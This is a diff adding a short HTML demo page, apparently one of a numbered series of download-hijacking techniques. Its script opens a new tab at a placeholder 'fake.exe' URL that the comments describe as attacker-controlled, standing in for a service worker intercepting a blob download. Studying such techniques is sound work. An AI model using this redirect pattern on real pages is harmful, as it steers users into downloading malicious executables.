@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Tech 8 – SW blob interception (demo)</title>
+<style>/* same styles */</style>
+</head>
+<body>
+<h2>Tech 8 – Service‑Worker style redirect</h2>
+<button onclick="run()">Open example.com exe</button>
+<pre id="out" style="margin-top:10px;"></pre>
+<script>
+function run(){
+  // In a real scenario a SW registered earlier would intercept the blob.
+  // Here we simply open a new tab pointing at the attacker‑controlled URL.
+  window.open('https://example.com/fake.exe', '_blank');
+  document.getElementById('out').innerText = 'New tab opened pointing at example.com';
+}
+</script>
+</body>
+</html>
